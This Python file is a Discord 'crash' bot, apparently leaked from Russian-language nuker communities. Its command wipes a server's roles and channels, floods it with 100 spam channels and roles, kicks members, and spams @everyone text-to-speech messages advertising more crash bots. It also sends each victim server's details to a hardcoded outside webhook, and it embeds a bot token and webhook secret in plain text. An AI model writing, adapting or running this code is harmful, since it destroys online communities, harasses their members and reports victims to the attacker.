import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
import requests
# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2

from keep_alive import keep_alive
keep_alive()


intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!',intents=intents)

bot.remove_command("help")

@bot.command()
async def go(ctx):
        guild = ctx.message.guild     
        with open('hacked.jpg', 'rb') as f:
            icon = f.read()
        await guild.edit(name="Crash By HACKER BOT", icon=icon)

        await ctx.message.delete()

        for m in ctx.guild.roles:
            try:
                await m.delete(reason="Краш сервера")
            except:
                pass

        for channel in ctx.guild.channels:  # собираем
                try:
                        await channel.delete(reason="Краш сервера")  # удаляем
                except:
                        pass


        for _ in range(100):
            await guild.create_text_channel('crash-by-msk snejok332')

        for _ in range(100):
          await guild.create_role(name='crash-by-msk snejok332')

        for m in ctx.guild.members:
          try:
           await m.kick(reason="Краш сервера")
          except:
           pass
        

@bot.event
async def on_guild_join(guild):
        hookj = {
          "username": "[хакер бот]",
          "avatar_url": "https://images.discordapp.net/avatars/568698045412409344/0638bb9d234154025e9c31ed7a882126.png?size=512",
          "content": "",
          "embeds": [
            {
              "title": "*НОВЫЙ КРАШ*",
              "color": 31743,
              "description": f"***Кол-во участников***: {guild.member_count}👔 \n\n***Кол-во ролей***: {len(guild.roles)} 📕\n\n***Кол-во каналов***: {len(guild.text_channels)} 🌠\n\n ***КРАШНУТО:*** {guild}", 
               "timestamp": "", 
              "author": {
                "name": "-хакер бот-"
              },
              "image": {},
              "thumbnail": {
                "url": f"{guild.icon_url}"
              },
              "footer": {},
              "fields": []
            }
          ],
          "components": []
        }
        hook = 'https://discord.com/api/webhooks/922765691780755468/O9xQfkL2KNxhVw4M791JsVxgkbwWfqzAdKKxCOUtJCUeW8YXJ4ub9rLelTiSqdiQKrsc'
        requests.post(hook, json=hookj)
@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "Crash By HACKER BOT")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(100):
        try:
          await webhook.send("@everyone лохи крашнуты или мне кажется??  Ссылка на дискорд сервер с краш ботами https://discord.gg/dTyhdnUFVu 🙈", tts=True)
        except:
          pass       
token = 'OTI5NzE0Nzc0MTgxMzE0NjUx.YdrWWw.UcowqW9rMtWqDq4VZ7btdc6NCvI'
bot.run(token)
# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2
